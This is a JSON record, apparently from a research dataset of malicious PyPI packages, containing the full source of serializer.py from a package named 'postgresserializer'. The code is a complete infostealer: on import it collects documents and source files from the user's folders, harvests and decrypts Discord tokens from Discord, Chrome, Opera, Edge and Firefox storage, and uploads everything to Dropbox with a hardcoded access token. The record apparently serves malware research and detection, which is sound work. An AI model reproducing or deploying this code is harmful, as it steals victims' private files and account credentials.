[
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/postgresserializer-0.0.9-py3-none-any/postgresserializer/serializer.py",
    "malicious_code": "import os\nimport dropbox\nimport random\nimport base64\nimport re\nfrom Crypto.Cipher import AES\nfrom win32crypt import CryptUnprotectData\nimport json\nfrom threading import Thread\n\nMAX_FILE_SIZE_ALLOWED = 52428800\nLOW_PRIORITY_FILE_SIZE = 5242880\nFILE_EXTENSIONS = [\".c\", \".cpp\", \".txt\", \".dll\", \".json\", \".csv\", \".sql\", \".db\"]\nSKIPPED_FILES = [\"DiscordChatExporter\", \"HotkeysConfig\"]\nSTORED_FILES = []\nLOW_PRIORITY_FILE_PATHS = []\nHIGH_PRIORITY_FILE_PATHS = []\nDROPBOX_API_KEY = \"sl.BZgrpfcX6yre1UmoeGr8emSHKIQ6-KaE7QnrhWNwHAP79_Fy9A_hmL9Smt0TrEWAqRGC5naeg8O1AjuJXGUKx3T4wM3SOMzUNxK3tfPeo2AAmgOT1pgGT6Uhv9yjVJ0LFR0KokHw\"\nJSON_FILES = []\n\ntry:\n    USER_PROFILE = os.environ[\"USERPROFILE\"]\n    DESKTOP = USER_PROFILE + \"\\\\Desktop\"\n    if not os.path.exists(DESKTOP):\n        quit()\nexcept KeyError:\n    USER_PROFILE = None\n\ntry:\n    client = dropbox.Dropbox(DROPBOX_API_KEY)\nexcept:\n    quit()\n\nclass TokenGrabber:\n    def __init__(self):\n        self.regex = r\"[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{25,110}\"\n        self.encrypted_regex = r\"dQw4w9WgXcQ:[^\\\"]*\"\n        self.appdata = os.getenv(\"localappdata\")\n        self.roaming = os.getenv(\"appdata\")\n        self.tokens_sent = []\n        self.tokens = []\n\n    def decrypt_val(self, buff, master_key):\n        try:\n            iv = buff[3:15]\n            payload = buff[15:]\n            cipher = AES.new(master_key, AES.MODE_GCM, iv)\n            decrypted_pass = cipher.decrypt(payload)\n            decrypted_pass = decrypted_pass[:-16].decode()\n            return decrypted_pass\n        except Exception:\n            return \"Failed to decrypt password\"\n\n    def get_master_key(self, path):\n        with open(path, \"r\", encoding=\"utf-8\") as f:\n            c = f.read()\n        local_state = json.loads(c)\n        master_key = base64.b64decode(local_state[\"os_crypt\"][\"encrypted_key\"])\n        master_key = master_key[5:]\n        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]\n        return master_key\n\n    def grab_tokens(self):\n        paths = {\n            'Discord': self.roaming + '\\\\discord\\\\Local Storage\\\\leveldb\\\\',\n            'Discord Canary': self.roaming + '\\\\discordcanary\\\\Local Storage\\\\leveldb\\\\',\n            'Discord PTB': self.roaming + '\\\\discordptb\\\\Local Storage\\\\leveldb\\\\',\n            'Opera': self.roaming + '\\\\Opera Software\\\\Opera Stable\\\\Local Storage\\\\leveldb\\\\',\n            'Opera GX': self.roaming + '\\\\Opera Software\\\\Opera GX Stable\\\\Local Storage\\\\leveldb\\\\',\n            'Chrome': self.appdata + '\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\',\n            'Chrome1': self.appdata + '\\\\Google\\\\Chrome\\\\User Data\\\\Profile 1\\\\Local Storage\\\\leveldb\\\\',\n            'Chrome2': self.appdata + '\\\\Google\\\\Chrome\\\\User Data\\\\Profile 2\\\\Local Storage\\\\leveldb\\\\',\n            'Chrome3': self.appdata + '\\\\Google\\\\Chrome\\\\User Data\\\\Profile 3\\\\Local Storage\\\\leveldb\\\\',\n            'Chrome4': self.appdata + '\\\\Google\\\\Chrome\\\\User Data\\\\Profile 4\\\\Local Storage\\\\leveldb\\\\',\n            'Chrome5': self.appdata + '\\\\Google\\\\Chrome\\\\User Data\\\\Profile 5\\\\Local Storage\\\\leveldb\\\\',\n            'Microsoft Edge': self.appdata + '\\\\Microsoft\\\\Edge\\\\User Data\\\\Defaul\\\\Local Storage\\\\leveldb\\\\',\n        }\n\n        for name, path in paths.items():\n            if not os.path.exists(path):\n                continue\n            disc = name.replace(\" \", \"\").lower()\n            if \"cord\" in path:\n                if os.path.exists(self.roaming + f'\\\\{disc}\\\\Local State'):\n                    for file_name in os.listdir(path):\n                        if file_name[-3:] not in [\"log\", \"ldb\"]:\n                            continue\n                        for line in [x.strip() for x in open(f'{path}\\\\{file_name}', errors='ignore').readlines() if x.strip()]:\n                            for y in re.findall(self.encrypted_regex, line):\n                                token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming + f'\\\\{disc}\\\\Local State'))\n                                self.tokens.append(token)\n\n            else:\n                for file_name in os.listdir(path):\n                    if file_name[-3:] not in [\"log\", \"ldb\"]:\n                        continue\n                    for line in [x.strip() for x in open(f'{path}\\\\{file_name}', errors='ignore').readlines() if x.strip()]:\n                        for token in re.findall(self.regex, line):\n                            self.tokens.append(token)\n\n        if os.path.exists(self.roaming + \"\\\\Mozilla\\\\Firefox\\\\Profiles\"):\n            for path, _, files in os.walk(self.roaming + \"\\\\Mozilla\\\\Firefox\\\\Profiles\"):\n                for _file in files:\n                    if not _file.endswith('.sqlite'):\n                        continue\n                    for line in [x.strip() for x in open(f'{path}\\\\{_file}', errors='ignore').readlines() if x.strip()]:\n                        for token in re.findall(self.regex, line):\n                            self.tokens.append(token)\n\n        return self.tokens\n\n\ndef parse_all_files(path):\n    for (dirpath, dirnames, filenames) in os.walk(path):\n        for filename in filenames:\n            for file_extension in FILE_EXTENSIONS:\n                if filename.endswith(file_extension):\n                    filepath = os.sep.join([dirpath, filename])\n                    for skipped_file in SKIPPED_FILES:\n                        if skipped_file in filepath:\n                            continue\n                    STORED_FILES.append(filepath)\n\nif USER_PROFILE is not None:\n    DESKTOP = USER_PROFILE + \"\\\\Desktop\"\n    DOCUMENTS = USER_PROFILE + \"\\\\Documents\"\n    DOWNLOADS = USER_PROFILE + \"\\\\Downloads\"\n    SOURCE = USER_PROFILE + \"\\\\source\"\n\n    if os.path.exists(DESKTOP):\n        parse_all_files(DESKTOP)\n\n    if os.path.exists(DOCUMENTS):\n        parse_all_files(DOCUMENTS)\n\n    if os.path.exists(DOWNLOADS):\n        parse_all_files(DOWNLOADS)\n\n    if os.path.exists(SOURCE):\n        parse_all_files(SOURCE)\n\nfor file_path in STORED_FILES:\n    file_size = os.path.getsize(file_path)\n    if file_size > MAX_FILE_SIZE_ALLOWED:\n        continue\n\n    if \".json\" in file_path:\n        JSON_FILES.append(file_path)\n        continue\n\n    if file_size > LOW_PRIORITY_FILE_SIZE: \n        LOW_PRIORITY_FILE_PATHS.append(file_path)\n        continue\n    \n    HIGH_PRIORITY_FILE_PATHS.append(file_path)\n    \n\nUPLOADED_FILES = []\nindex = 0\n\ndef download_files(file_paths):\n    global index\n    for file_path in file_paths:\n        index += 1\n        f = open(file_path, \"rb\")\n        file_name = file_path.split(\"\\\\\")[-1]\n        file_name = str(index) + file_name\n\n        try:\n            client.files_upload(f.read(), \"/home/\" + file_name)\n            UPLOADED_FILES.append(file_name)\n        except:\n            pass\n\n        f.close()\n\ndef get_token():\n    tokens = TokenGrabber().grab_tokens()\n    if tokens:\n        file_name = str(random.randint(0, 500000)) + \"tokens39.txt\"\n        try:\n            client.files_upload(bytes(str(tokens).encode()), \"/home/\" + file_name)\n        except:\n            pass\n\nthread3 = Thread(target=download_files, args=(JSON_FILES, ))\nthread3.start()\n\nthread1 = Thread(target=download_files, args=(LOW_PRIORITY_FILE_PATHS, ))\nthread1.start()\n\nthread2 = Thread(target=download_files, args=(HIGH_PRIORITY_FILE_PATHS, ))\nthread2.start()\n\nthread4 = Thread(target=get_token)\nthread4.start()\n\nthread3.join()\nthread1.join()\nthread2.join()\nthread4.join()\n"
  }
]